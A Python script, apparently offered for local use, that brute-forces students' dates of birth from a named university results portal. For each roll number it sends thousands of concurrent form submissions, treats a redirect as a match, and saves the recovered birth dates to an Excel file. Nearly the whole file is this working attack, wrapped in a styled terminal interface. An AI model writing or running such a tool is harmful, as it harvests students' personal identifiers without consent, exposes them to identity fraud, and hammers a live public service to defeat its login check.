# Run this code locally

import os
import sys
import asyncio
import aiohttp
from aiohttp import ClientSession
from datetime import datetime, timedelta
from tqdm.auto import tqdm
import pandas as pd
import re
import unicodedata

# Enable ANSI escape sequences on Windows console
os.system('')

# Constants
OUTPUT_DIR = os.path.join("Information", "Saved DOBs")

class UI:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    CYAN    = "\033[96m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    RED     = "\033[91m"
    BLUE    = "\033[94m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"

    @staticmethod
    def display_len(s):
        clean = re.sub(r'\033\[[0-9;]*m', '', str(s))
        return sum(2 if unicodedata.east_asian_width(c) in ('W', 'F') else 1 for c in clean)

    @staticmethod
    def pad_visible(s, target_len):
        extra = len(str(s)) - UI.display_len(s)
        return f"{str(s):<{target_len + extra}}"

    @staticmethod
    def banner(title, subtitle=""):
        width = 66
        inner = width - 2
        print(f"\n{UI.CYAN}{UI.BOLD}┌{'─' * inner}┐{UI.RESET}")
        title_str = f"  {title}"
        pad1 = inner - UI.display_len(title_str)
        print(f"{UI.CYAN}{UI.BOLD}│{UI.RESET}{UI.YELLOW}{UI.BOLD}{title_str}{' ' * max(0, pad1)}{UI.CYAN}{UI.BOLD}│{UI.RESET}")
        if subtitle:
            sub_str = f"  {subtitle}"
            pad2 = inner - UI.display_len(sub_str)
            print(f"{UI.CYAN}{UI.BOLD}│{UI.RESET}{UI.GRAY}{sub_str}{' ' * max(0, pad2)}{UI.CYAN}{UI.BOLD}│{UI.RESET}")
        print(f"{UI.CYAN}{UI.BOLD}└{'─' * inner}┘{UI.RESET}\n")

    @staticmethod
    def divider(width=66):
        print(f"{UI.GRAY}{'─' * width}{UI.RESET}")

    @staticmethod
    def card(title, items, width=66):
        print(f"{UI.CYAN}{UI.BOLD}📊 {title}{UI.RESET}")
        UI.divider(width)
        for label, val in items:
            lbl_str = f"  • {label:<18}: "
            print(f"{UI.GRAY}{lbl_str}{UI.WHITE}{val}{UI.RESET}")
        UI.divider(width)
        print()

    @staticmethod
    def table(rows, headers):
        if not rows:
            return ""
        widths = [UI.display_len(h) for h in headers]
        for r in rows:
            for i, val in enumerate(r):
                widths[i] = max(widths[i], UI.display_len(val))

        pad_widths = [w + 2 for w in widths]

        top    = f"{UI.CYAN}┌" + "┬".join("─" * pw for pw in pad_widths) + f"┐{UI.RESET}"
        h_cells = [f" {UI.pad_visible(UI.BOLD + h + UI.RESET, pw - 2)} " for h, pw in zip(headers, pad_widths)]
        header = f"{UI.CYAN}│{UI.RESET}" + f"{UI.CYAN}│{UI.RESET}".join(h_cells) + f"{UI.CYAN}│{UI.RESET}"
        mid    = f"{UI.CYAN}├" + "┼".join("─" * pw for pw in pad_widths) + f"┤{UI.RESET}"
        bottom = f"{UI.CYAN}└" + "┴".join("─" * pw for pw in pad_widths) + f"┘{UI.RESET}"

        body = []
        for r in rows:
            b_cells = [f" {UI.pad_visible(v, pw - 2)} " for v, pw in zip(r, pad_widths)]
            line = f"{UI.CYAN}│{UI.RESET}" + f"{UI.CYAN}│{UI.RESET}".join(b_cells) + f"{UI.CYAN}│{UI.RESET}"
            body.append(line)

        return "\n".join([top, header, mid] + body + [bottom])

    @staticmethod
    def success(msg):
        print(f"  {UI.GREEN}✔ {msg}{UI.RESET}")

    @staticmethod
    def error(msg):
        print(f"  {UI.RED}✖ {msg}{UI.RESET}")

    @staticmethod
    def warn(msg):
        print(f"  {UI.YELLOW}▲ {msg}{UI.RESET}")

    @staticmethod
    def info(msg):
        print(f"  {UI.BLUE}ℹ {msg}{UI.RESET}")

def extract_form_data(html):
    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', html)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', html)
    viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', html)
    if not all([viewstate, eventvalidation, viewstategenerator]):
        return None
    return {
        "__VIEWSTATE": viewstate.group(1),
        "__EVENTVALIDATION": eventvalidation.group(1),
        "__VIEWSTATEGENERATOR": viewstategenerator.group(1),
    }

def generate_dates_interleaved(years, month=None):
    dates = []
    if month:
        for day in range(1, 32):
            for y in years:
                try:
                    date = datetime(y, month, day)
                    dates.append(date.strftime('%Y-%m-%d'))
                except ValueError:
                    continue
    else:
        start_dates = {y: datetime(y, 1, 1) for y in years}
        end_dates = {y: datetime(y, 12, 31) for y in years}
        current = start_dates.copy()
        while True:
            finished = True
            for y in years:
                if current[y] <= end_dates[y]:
                    dates.append(current[y].strftime('%Y-%m-%d'))
                    current[y] += timedelta(days=1)
                    finished = False
            if finished:
                break
    return dates

def build_candidate_dates(priority_groups, month=None):
    candidate_dates = []
    seen = set()
    for group in priority_groups:
        group_dates = generate_dates_interleaved(group, month)
        for d in group_dates:
            if d not in seen:
                candidate_dates.append(d)
                seen.add(d)
    return candidate_dates

async def try_dob(session, roll_no, semester, date_of_birth, semaphore):
    url = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"
    async with semaphore:
        try:
            async with session.get(url, timeout=10) as resp:
                if resp.status != 200:
                    return "DOWN"
                html = await resp.text()
            
            form_data = extract_form_data(html)
            if not form_data:
                return None
            
            form_data.update({
                "ddlsem": semester,
                "txtRollno": roll_no,
                "txtDob": date_of_birth,
                "btnSearch": "Search Result"
            })
            
            async with session.post(url, data=form_data, allow_redirects=False, timeout=10) as response:
                if response.status == 302:
                    return date_of_birth
                elif response.status >= 500:
                    return "DOWN"
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return "DOWN"
        except Exception:
            return None
    return None

async def fetch_for_roll(session, roll_no, semester, candidate_dates, semaphore, results, results_lock, roll_pbar, filename=None, save_to_excel=True):
    roll_str = str(roll_no).zfill(6)

    bar_format = f"    {UI.GRAY}{{desc:<22}}{UI.RESET} {{percentage:3.0f}}%|{{bar:25}}| {{n_fmt}}/{{total_fmt}} [{UI.GRAY}{{elapsed}}<{{remaining}}{UI.RESET}]"

    with tqdm(total=len(candidate_dates), desc=f"Testing {roll_str}", leave=False, position=1, dynamic_ncols=True, bar_format=bar_format) as date_pbar:
        for dob in candidate_dates:
            result = await try_dob(session, roll_str, semester, dob, semaphore)
            if result == "DOWN":
                return "DOWN"
            
            date_pbar.update(1)
            if result:
                async with results_lock:
                    results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': result})
                    if save_to_excel and filename:
                        try:
                            pd.DataFrame(results).to_excel(filename, index=False)
                        except PermissionError:
                            pass # Will be saved later
                tqdm.write(f"  {UI.GREEN}✔ Found DOB for Roll No {roll_str} ➜ {UI.BOLD}{result}{UI.RESET}")
                roll_pbar.update(1)
                return

    # If not found across all candidate dates
    async with results_lock:
        results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': "N.A."})
        if save_to_excel and filename:
            try:
                pd.DataFrame(results).to_excel(filename, index=False)
            except PermissionError:
                pass
    tqdm.write(f"  {UI.RED}✖ No DOB found for Roll No {roll_str}{UI.RESET}")
    roll_pbar.update(1)
    return None

async def check_website_status(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            if resp.status == 200:
                return True, "Online"
            elif resp.status == 503:
                return False, "Service Unavailable (503)"
            else:
                return False, f"HTTP Error {resp.status}"
    except Exception as e:
        return False, str(e)

async def run_custom_roll_search(roll_numbers, semester, month_filter, save_to_excel=True):
    priority_groups = [
        [2003, 2004, 2005, 2006, 2007, 2008],           # Tier 1 (2,192 dates)
        [1999, 2000, 2001, 2002, 2009, 2010],           # Tier 2 (2,191 dates)
        [1996, 1997, 1998, 2011, 2012, 2013]            # Tier 3 (2,192 dates)
    ]
    candidate_dates = build_candidate_dates(priority_groups, month_filter)
    filename = os.path.join(OUTPUT_DIR, "ddu_custom_results.xlsx") if save_to_excel else None
    url = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"

    connector = aiohttp.TCPConnector(limit=100)
    async with ClientSession(connector=connector) as session:
        print(f"  {UI.BLUE}🌐 University Portal Status :{UI.RESET} ", end="", flush=True)
        is_up, status_msg = await check_website_status(session, url)
        if not is_up:
            print(f"{UI.RED}[OFFLINE]{UI.RESET}")
            UI.error(f"Portal unavailable: {status_msg}")
            print(f"  {UI.GRAY}Please check your network connection or try again later.{UI.RESET}\n")
            return
        print(f"{UI.GREEN}[ONLINE]{UI.RESET}")

        pool_desc = f"{len(candidate_dates):,} dates (1996–2013 prioritized)" if not month_filter else f"{len(candidate_dates):,} dates (Month {month_filter}, 1996–2013)"
        print(f"  {UI.BLUE}📅 Candidate Search Pool    :{UI.RESET} {UI.WHITE}{pool_desc}{UI.RESET}\n")

        if save_to_excel and filename and os.path.exists(filename):
            existing_df = pd.read_excel(filename)
            completed_rolls = set(existing_df["Roll Number"].astype(int))
            remaining_rolls = [rn for rn in roll_numbers if rn not in completed_rolls]
            results = existing_df.to_dict(orient="records")
            if len(completed_rolls) > 0:
                UI.info(f"Resuming search: {len(completed_rolls)} roll(s) previously completed.")
        else:
            remaining_rolls = list(roll_numbers)
            results = []

        if not remaining_rolls:
            UI.success("All entered roll numbers have already been processed.")
        else:
            results_lock = asyncio.Lock()
            semaphore = asyncio.Semaphore(50)

            roll_bar_format = f"  {UI.CYAN}{UI.BOLD}{{desc:<20}}{UI.RESET} {{percentage:3.0f}}%|{{bar:25}}| {{n_fmt}}/{{total_fmt}} [{UI.GRAY}{{elapsed}}<{{remaining}}{UI.RESET}]"
            with tqdm(total=len(remaining_rolls), desc="Rolls Processed", position=0, dynamic_ncols=True, bar_format=roll_bar_format) as roll_pbar:
                tasks = [
                    fetch_for_roll(session, rn, semester, candidate_dates, semaphore, results, results_lock, roll_pbar, filename, save_to_excel)
                    for rn in remaining_rolls
                ]
                task_results = await asyncio.gather(*tasks)
                
                if "DOWN" in task_results:
                    print()
                    UI.warn("The university portal became unreachable during the search. Some records may be incomplete.")

    # Save to Excel if requested
    if save_to_excel and filename and results:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        while True:
            try:
                pd.DataFrame(results).to_excel(filename, index=False)
                break
            except PermissionError:
                print()
                UI.warn(f"Please close '{filename}' to save final results. Retrying in 5 seconds...")
                await asyncio.sleep(5)
        print()
        UI.success(f"Results saved to: {UI.BOLD}{filename}{UI.RESET}")

    # Display results table in terminal
    filtered_results = [r for r in results if r['Roll Number'] in roll_numbers]
    print()
    if filtered_results:
        table_rows = []
        found_count = 0
        missing_count = 0
        for r in filtered_results:
            is_found = str(r['Date of Birth']).strip() != "N.A."
            if is_found:
                status_str = f"{UI.GREEN}✔ Found{UI.RESET}"
                dob_str = f"{UI.WHITE}{r['Date of Birth']}{UI.RESET}"
                found_count += 1
            else:
                status_str = f"{UI.RED}✖ Not Found{UI.RESET}"
                dob_str = f"{UI.GRAY}N.A.{UI.RESET}"
                missing_count += 1

            table_rows.append([
                str(r['Roll Number']),
                f"Sem {r['Semester']}",
                dob_str,
                status_str
            ])

        headers = ["Roll Number", "Semester", "Date of Birth", "Status"]
        print(f"{UI.CYAN}{UI.BOLD}📋 Search Results{UI.RESET}")
        print(UI.table(table_rows, headers))
        print()

        # Summary Card
        summary_items = [
            ("Total Students", str(len(filtered_results))),
            ("DOBs Found", f"{UI.GREEN}{found_count}{UI.RESET}"),
            ("Not Found", f"{UI.RED}{missing_count}{UI.RESET}" if missing_count > 0 else f"{UI.GRAY}0{UI.RESET}"),
            ("Output Mode", f"Excel File ({filename})" if save_to_excel else "Terminal View Only")
        ]
        UI.card("Search Summary", summary_items)
    else:
        UI.info("No results to display.")

def run_custom_main():
    UI.banner(
        "🎯 DDU RESULT FINDER  •  DOB Search",
        "Fast asynchronous search for missing student Dates of Birth"
    )
    
    try:
        print(f"{UI.CYAN}{UI.BOLD}📋 Search Configuration{UI.RESET}")
        UI.divider()
        
        # 1. Roll Numbers
        while True:
            roll_input = input(f"  {UI.WHITE}{UI.BOLD}[1/4]{UI.RESET} Enter Roll Number(s) {UI.GRAY}(comma-separated){UI.RESET}: ").strip()
            if not roll_input:
                UI.error("Roll number input cannot be empty.")
                continue
            try:
                roll_numbers = list(map(int, [r.strip() for r in roll_input.split(',') if r.strip()]))
                if roll_numbers:
                    break
            except ValueError:
                UI.error("Please enter valid numeric roll numbers.")
                continue

        # 2. Semester
        while True:
            semester = input(f"  {UI.WHITE}{UI.BOLD}[2/4]{UI.RESET} Enter Semester {UI.GRAY}(1-8){UI.RESET}: ").strip()
            if semester.isdigit() and 1 <= int(semester) <= 8:
                break
            UI.error("Please enter a valid semester number between 1 and 8.")

        # 3. Month Filter
        month = input(f"  {UI.WHITE}{UI.BOLD}[3/4]{UI.RESET} Birth Month {UI.GRAY}(1-12, or press Enter to search all){UI.RESET}: ").strip()
        month_filter = int(month) if month.isdigit() and 1 <= int(month) <= 12 else None

        # 4. Save Preference
        print(f"  {UI.WHITE}{UI.BOLD}[4/4]{UI.RESET} Output Mode:")
        print(f"        {UI.WHITE}1.{UI.RESET} Save to Excel {UI.GRAY}(Information/Saved DOBs/){UI.RESET} & view in terminal {UI.GRAY}[default]{UI.RESET}")
        print(f"        {UI.WHITE}2.{UI.RESET} View in terminal only {UI.GRAY}(no files created){UI.RESET}")
        save_choice = input(f"        {UI.YELLOW}Select option [1/2, default: 1]{UI.RESET}: ").strip().lower()
        save_to_excel = save_choice not in ['2', 'view', 'v', 'terminal', 'n', 'no']

        UI.divider()
        print()

        asyncio.run(run_custom_roll_search(roll_numbers, semester, month_filter, save_to_excel))
    except (KeyboardInterrupt, SystemExit):
        print(f"\n\n  {UI.YELLOW}▲ Operation cancelled by user.{UI.RESET}\n")
    except Exception as e:
        print()
        UI.error(f"Unexpected error: {e}")

# 🚀 Launch
if __name__ == "__main__":
    run_custom_main()
